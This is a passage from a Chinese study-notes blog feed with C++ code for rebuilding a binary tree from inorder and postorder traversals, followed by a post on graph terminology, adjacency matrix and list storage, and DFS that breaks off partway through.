aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="4-中序-后序构造二叉树，输出层序遍历">4. 中序 + 后序构造二叉树，输出层序遍历</h2><p>这道题其实还可以类比那些知道中序+前序遍历求后序遍历的题目，可以见经典的 <a href="https://www.luogu.com.cn/problem/P1827">洛谷 P1827</a>这类题型。</p><h3 id="基本思路-2">基本思路</h3><ul><li>后序的最后一个元素是当前根节点</li><li>在中序中找到这个根节点的位置，这个根节点左侧是左子树所有节点，右侧是右子树所有节点</li><li>使用递归构建左右子树</li><li>构建完毕后使用 <code>queue</code>进行简单的入队push出队pop来递归层序遍历。</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//还原树</span>TreeNode<span class="token operator">*</span> <span class="token function">buildTreeHelper</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> in<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> post<span class="token punctuation">,</span> <span class="token keyword">int</span> inL<span class="token punctuation">,</span> <span class="token keyword">int</span> inR<span class="token punctuation">,</span> <span class="token keyword">int</span> postL<span class="token punctuation">,</span> <span class="token keyword">int</span> postR<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>inL <span class="token operator">></span> inR<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> rootVal <span class="token operator">=</span> post<span class="token punctuation">[</span>postR<span class="token punctuation">]</span><span class="token punctuation">;</span>    TreeNode<span class="token operator">*</span> root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>rootVal<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> k <span class="token operator">=</span> inL<span class="token punctuation">;</span>    <span class="token comment">//如果是string的话，我们直接可以str.find(rootVal)找到中序遍历中根节点的位置。</span>    <span class="token comment">//这和那道 p1827 思路其实是一致的。</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>in<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">!=</span> rootVal<span class="token punctuation">)</span> <span class="token operator">++</span>k<span class="token punctuation">;</span>    <span class="token keyword">int</span> leftSize <span class="token operator">=</span> k <span class="token operator">-</span> inL<span class="token punctuation">;</span>    root<span class="token operator">-></span>left <span class="token operator">=</span> <span class="token function">buildTreeHelper</span><span class="token punctuation">(</span>in<span class="token punctuation">,</span> post<span class="token punctuation">,</span> inL<span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> postL<span class="token punctuation">,</span> postL <span class="token operator">+</span> leftSize <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    root<span class="token operator">-></span>right <span class="token operator">=</span> <span class="token function">buildTreeHelper</span><span class="token punctuation">(</span>in<span class="token punctuation">,</span> post<span class="token punctuation">,</span> k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> inR<span class="token punctuation">,</span> postL <span class="token operator">+</span> leftSize<span class="token punctuation">,</span> postR <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> root<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//层序遍历</span><span class="token keyword">void</span> <span class="token function">levelOrder</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>root<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> q<span class="token punctuation">;</span>    q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        TreeNode<span class="token operator">*</span> cur <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> cur<span class="token operator">-></span>val <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token operator">-></span>left<span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token operator">-></span>right<span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>时间复杂度： <code>O(n)</code> 构建二叉树和层序遍历都是访问树所有节点，因此时间复杂度一致。<br>空间复杂度： <code>O(n)</code></p><hr><p><strong>更新施工中…</strong></p>]]></content>
    
    
    <summary type="html">马上就数据结构期中考试了...</summary>
    
    
    
    <category term="日常学习" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数据结构" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="学习" scheme="https://notes.moyuin.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数据结构" scheme="https://notes.moyuin.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="编程" scheme="https://notes.moyuin.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>数据结构-图</title>
    <link href="https://notes.moyuin.top/2025/04/08/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-tu/"/>
    <id>https://notes.moyuin.top/2025/04/08/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-tu/</id>
    <published>2025-04-08T02:39:49.000Z</published>
    <updated>2025-04-08T02:39:49.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>数据结构-图</h1><p>图就是一群<strong>点与点之间的连接关系</strong>。</p><blockquote><p>图 = 点 + 关系</p></blockquote><p>我们一般利用矩阵对它进行计算。</p><h2 id="图的术语">图的术语</h2><p>图的术语很多很多，分类记忆优先。</p><h3 id="一类：必须掌握，写代码会直接用到的术语"><strong>一类：必须掌握，写代码会直接用到的术语</strong></h3><p>这些术语不仅是定义，更是写代码、分析题目的关键词</p><table><thead><tr><th>术语</th><th>意义</th></tr></thead><tbody><tr><td><strong>有向图 / 无向图</strong></td><td>箭头 vs 无箭头，影响建边方式（<code>add(u,v)</code> 是否对称）</td></tr><tr><td><strong>邻接（Adjacency）</strong></td><td>一个点相邻的所有点，用于 DFS / BFS</td></tr><tr><td><strong>出度 / 入度 / 度</strong></td><td>出去多少条边、进来多少条边，图遍历/拓扑排序常用</td></tr><tr><td><strong>加权图</strong></td><td>边有权值了，要用 <code>edge.to, edge.w</code> 来写</td></tr><tr><td><strong>简单路径 / 简单环</strong></td><td>不重复点的路径 / 环，DFS 搜索路径时要判断</td></tr><tr><td><strong>子图</strong></td><td>原图的一部分，图论算法经常讲“找子图”</td></tr></tbody></table><h3 id="二类：理解了就能用的术语"><strong>二类：理解了就能用的术语</strong></h3><p>这些术语不是写代码的前提，但出现在算法分析里，比如题干说“强连通分量”，得知道那是啥</p><table><thead><tr><th>术语</th><th>建议</th></tr></thead><tbody><tr><td><strong>连通图 / 强连通图</strong></td><td>DFS/BFS 一遍能走完 vs 每个点都能互相到达</td></tr><tr><td><strong>连通分量 / 强连通分量</strong></td><td>把图分成“互相能到达的块”</td></tr><tr><td><strong>极大连通子图</strong></td><td>不能再扩展的连通分量，Tarjan算法中会用</td></tr><tr><td><strong>网络（flow network）</strong></td><td>用于网络流，前期接触少，可以见到再查</td></tr><tr><td><strong>回路 / 环 / 简单环</strong></td><td>DFS 检测环判断用，图论题会提到</td></tr></tbody></table><p>画成图理解，有题再回笔记复习，不需要死记硬背术语。<br>让G老师整理了一个简略的模板，复制粘贴一下。</p><h3 id="图论术语学习笔记，仅供查阅">图论术语学习笔记，仅供查阅</h3><table><thead><tr><th>术语</th><th>中文解释</th><th>图论举例</th><th>代码意义 / 使用场景</th></tr></thead><tbody><tr><td>有向图</td><td>边有方向，A→B 与 B→A 不同</td><td>A → B → C</td><td>邻接表只存 u→v，不加反边</td></tr><tr><td>无向图</td><td>边无方向，A-B 是双向的</td><td>A - B - C</td><td>建边要加两次 u↔v</td></tr><tr><td>邻接</td><td>某个点能直接到达的点</td><td>A 相邻点为 B, C</td><td>DFS / BFS / 最短路核心</td></tr><tr><td>入度</td><td>进入该点的边数</td><td>C 有入度 2：A→C, B→C</td><td>拓扑排序判断是否入度为 0</td></tr><tr><td>出度</td><td>从该点出发的边数</td><td>A 有出度 1：A→B</td><td>构建邻接表或最短路用</td></tr><tr><td>度</td><td>无向图中与该点相连的总边数</td><td>B 有度 3：连了 A, C, D</td><td>统计图结构复杂度</td></tr><tr><td>加权图</td><td>每条边有权重值（如距离、代价）</td><td>边 A→B 权重为 3</td><td>需要额外记录权重 edge.w</td></tr><tr><td>简单路径</td><td>路径中点不重复</td><td>A→B→C 合法</td><td>DFS 中用 visited[] 防止重复</td></tr><tr><td>简单环 / 回路</td><td>点不重复的闭环</td><td>A→B→A 是简单环</td><td>判断是否有环</td></tr><tr><td>子图</td><td>图的一部分（点与边的子集）</td><td>G 的子图仅含 A, B, C</td><td>大图中划分子问题</td></tr><tr><td>连通图</td><td>任意两个点之间有路径</td><td>一笔能走完所有点</td><td>用 DFS / BFS 判断连通性</td></tr><tr><td>强连通图</td><td>有向图中任意两点互达</td><td>所有点之间都有双向路径</td><td>Tarjan 算法中强连通分量（SCC）判定</td></tr><tr><td>连通分量</td><td>连通图中独立的“块”</td><td>一个图被分成多个连通子图</td><td>并查集找连通块 / 统计图中有几个分量</td></tr><tr><td>强连通分量</td><td>强连通图中的“极大块”</td><td>Tarjan 算法识别强连通部分</td><td>拆图结构、题目要求找 SCC 时使用</td></tr><tr><td>极大连通子图</td><td>无法再扩展的连通图</td><td>一次 DFS 得到的整块</td><td>判最大图结构 / DFS 局部图遍历</td></tr><tr><td>极小连通子图</td><td>包含所有点、最少边的连通图，去掉一条边就不连通，增加一条边就成环</td><td>原图有环，生成树去掉了冗余边</td><td>用来描述 MST 的性质/写题时判断图是否成树常用</td></tr><tr><td>网络（flow）</td><td>带容量限制的有向图</td><td>边 A→B 最大流 5</td><td>最大流 / 最小割等网络流建模</td></tr></tbody></table><hr><h2 id="比较">比较</h2><p>线性、树、图结构中</p><ul><li>线性结构中，每个元素只有<strong>一个直接前驱和直接后继</strong>。</li><li>树形结构中，每个元素中有<strong>一个直接前驱</strong>，但可以有<strong>多个直接后继</strong>。</li><li>图形结构中，数据元素之间的关系任意。每个元素可以和任意多个数据元素相关，有任意多个直接前驱和直接后继。<em>（在无向图中，在有向图视角下甚至互为前驱后继）</em></li></ul><hr><h2 id="实现">实现</h2><h3 id="ADT的C-类表示">ADT的C++类表示</h3><blockquote><p><code>Graph</code> 是一个支持添加边、遍历（DFS/BFS）、获取邻接点的抽象图结构。<br>支持有向图和无向图的建图形式，底层使用邻接表实现。适合作为图论算法的基础类。</p></blockquote><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 图的抽象数据类型（ADT）结构表示</span><span class="token keyword">class</span> <span class="token class-name">Graph</span> <span class="token punctuation">&#123;</span><span class="token keyword">private</span><span class="token operator">:</span>    <span class="token keyword">int</span> V<span class="token punctuation">;</span> <span class="token comment">// 顶点数量</span>    <span class="token keyword">bool</span> directed<span class="token punctuation">;</span> <span class="token comment">// 是否为有向图</span>    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> adj<span class="token punctuation">;</span> <span class="token comment">// 邻接表表示图</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token comment">// 构造函数：初始化图的顶点数量与有向/无向标志</span>    <span class="token function">Graph</span><span class="token punctuation">(</span><span class="token keyword">int</span> vertices<span class="token punctuation">,</span> <span class="token keyword">bool</span> isDirected <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        V <span class="token operator">=</span> vertices<span class="token punctuation">;</span>        directed <span class="token operator">=</span> isDirected<span class="token punctuation">;</span>        adj<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>V<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 添加一条边（u 到 v）</span>    <span class="token keyword">void</span> <span class="token function">addEdge</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">,</span> <span class="token keyword">int</span> v<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        adj<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>directed<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            adj<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 无向图加双向边</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 获取一个点的所有邻接点</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">getNeighbors</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> adj<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 深度优先遍历（DFS）</span>    <span class="token keyword">void</span> <span class="token function">DFS</span><span class="token punctuation">(</span><span class="token keyword">int</span> start<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span><span class="token operator">&amp;</span> visited<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        visited<span class="token punctuation">[</span>start<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> v <span class="token operator">:</span> adj<span class="token punctuation">[</span>start<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">DFS</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> visited<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 广度优先遍历（BFS）</span>    <span class="token keyword">void</span> <span class="token function">BFS</span><span class="token punctuation">(</span><span class="token keyword">int</span> start<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">visited</span><span class="token punctuation">(</span>V<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> q<span class="token punctuation">;</span>        q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">;</span>        visited<span class="token punctuation">[</span>start<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> u <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> v <span class="token operator">:</span> adj<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    visited<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 获取图中顶点数量</span>    <span class="token keyword">int</span> <span class="token function">getVertexCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> V<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 获取图中某点的度数（无向图）或出度（有向图）</span>    <span class="token keyword">int</span> <span class="token function">getDegree</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">)</span> <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> adj<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="存储">存储</h3><p>图的存储用于存储点和边的关系，主要有2种方法。</p><ul><li>邻接矩阵：用一个二维表格记录“有没有边”</li><li>邻接表：每个点有一张自己的“出边名单”</li></ul><h4 id="邻接矩阵（二维数组）">邻接矩阵（二维数组）</h4><ul><li>适合小图，构造简单直接。有几个顶点就存几个方向。</li><li><strong>在一维数组里面存储顶点信息，二维矩阵中存储边的信息</strong>。</li><li>用一个二维数组 <code>g[i][j]</code> 表示<br>有边：<code>g[i][j] = 1</code>（或权值 w）<br>没边：<code>g[i][j] = 0</code>（或 INF，无穷大)</li></ul><p><img src="/images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE/20250325111944762.png" alt=""><br>对于<strong>稠密图，有向图</strong>，采用邻接矩阵非常合适。但存储大量无边信息，造成空间浪费。<br><em>这个很好构造，创一个二维数组，赋值关系间就好。比如1号元素指向2号元素，权值为2，则</em>  <code>g[1][2]=2</code><br>对于一些有权图问题，我们为了代码能跑，经常会设置INF，辅助最小路径问题，这样输入也方便</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span>graph<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">!=</span> j<span class="token punctuation">)</span> graph<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> INF<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="邻接表">邻接表</h4><p>邻接表的实现和邻接矩阵很像，但不约束于邻接矩阵<code>n*n</code>的固定大小。<br>每一个顶点使用一个<strong>一维数组</strong>来存储，而边的存储是同一个顶点出发的所有边，组成<strong>一条单链表</strong>。<br>我们用 STL 实现的话，vector 的 push_back() 很好的起到了邻接表的实现来存储图。邻接表就是链表式的图结构。<br>当然也可以直接用链表，跳转。<br><img src="/images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE/20250325113155345.png" alt=""><br>对于<strong>稀疏图，无向图</strong>，采用邻接表非常合适。空间利用效率大幅度提高，不存储无边的无用信息。</p><h5 id="STL-实现">STL 实现</h5><p><strong>无权图版本</strong></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//基本结构</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">10010</span><span class="token punctuation">;</span> <span class="token comment">// 最大点数</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> graph<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 邻接表：graph[u] 存放 u 的邻接点</span><span class="token comment">//加边操作</span><span class="token keyword">void</span> <span class="token function">addEdge</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">,</span> <span class="token keyword">int</span> v<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    graph<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>    graph<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 无向图要加两次</span><span class="token punctuation">&#125;</span><span class="token comment">//遍历</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> v <span class="token operator">:</span> graph<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// u → v 有一条边</span><span class="token punctuation">&#125;</span><span class="token comment">//非常类似链表遍历，每个点自己的链表就是vector</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>有权图版本</strong></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span> graph<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// pair&lt;to, weight></span><span class="token keyword">void</span> <span class="token function">addEdge</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">,</span> <span class="token keyword">int</span> v<span class="token punctuation">,</span> <span class="token keyword">int</span> w<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    graph<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>v<span class="token punctuation">,</span> w<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 如果是无向图：</span>    <span class="token comment">// graph[v].push_back(&#123;u, w&#125;);</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token punctuation">[</span>v<span class="token punctuation">,</span> w<span class="token punctuation">]</span> <span class="token operator">:</span> graph<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// u → v, 权重为 w</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="链表实现"><strong>链表实现</strong></h5> <pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"> <span class="token keyword">struct</span> <span class="token class-name">Graph</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span><span class="token comment">//边的构造</span>        <span class="token keyword">int</span> to<span class="token punctuation">;</span>           <span class="token comment">// 边通往哪个点</span>        Node<span class="token operator">*</span> next<span class="token punctuation">;</span>       <span class="token comment">// 还有没有其他边从该店出去</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    Node<span class="token operator">*</span> head<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">// 图的点对应的边，是数组</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">addEdge</span><span class="token punctuation">(</span><span class="token keyword">int</span> from<span class="token punctuation">,</span> <span class="token keyword">int</span> to<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    Node<span class="token operator">*</span> newNode <span class="token operator">=</span> <span class="token keyword">new</span> Node<span class="token punctuation">&#123;</span>to<span class="token punctuation">,</span> head<span class="token punctuation">[</span>from<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    head<span class="token punctuation">[</span>from<span class="token punctuation">]</span> <span class="token operator">=</span> newNode<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//插入边</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>“如果一个点有很多出边怎么办？如果没有出边怎么办？”</p></blockquote><p>那我们就反向思维，我们链表存储的是<strong>图的边</strong>，并非图的所有点。点可以对应很多边，但边可以对应只有两个点。而且我们图的关系，看的往往是边的关系。</p><ul><li>顶点编号 = <code>head[i]</code> 中的 <code>i</code></li><li>边 = 存在于从 <code>i</code> 出发的一串 <code>Node</code></li><li><code>to</code> 指向的是该边的到达点，出发点就是插入这条边的时候所在的下标。</li></ul><p>插入边直接 addEdge(1,2)，插入一条从1指向2的边。我们每一次构造都是插入 Node 。<br><code>head[from] = newNode</code> 表面上是赋值，<br>但这行代码背后的意义是：</p><blockquote><p>把新的边插在原链表的最前面，原来的边通过 <code>newNode-&gt;next</code> 继续挂在后面。</p></blockquote><p>建立新节点的时候 <code>new node&#123;to,head[from]&#125;</code> 把旧的链表接在新边后面，<strong>实现了“头插法”追加”</strong>。</p><hr><h2 id="遍历">遍历</h2><p>遍历图和遍历二叉树不太一样，图的每个顶点地位相同，我们要判断“一个点是否被访问过”，避免遗漏。</p><h3 id="DFS">DFS</h3><p><em>其实感觉有点像开 bool 数组呢…</em><br>深度优先遍历。<br><img src="/images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE/20250401110553640.png" alt=""><br><strong>访问方式</strong>：</p><ul><li>从选中的某一个未访问过的顶点出发，访问并对该顶点加已访问标志。</li><li>依次从该顶点的未被访问过的第1个、第2个、第3个…… 邻接顶点出发，依次进行<strong>深度优先遍历</strong>，即转向1。</li><li>如果还有顶点未被访问过，选中其中一个顶点作为起始顶点，再次转向1。如果 所有的顶点都被访问到，遍历结束。<br>简单点就是，一条路一直走，走到头，栈式回退，一层层卸载。<br><strong>注意：</strong></li><li>深度优先遍历结果不唯一。</li><li>DFS 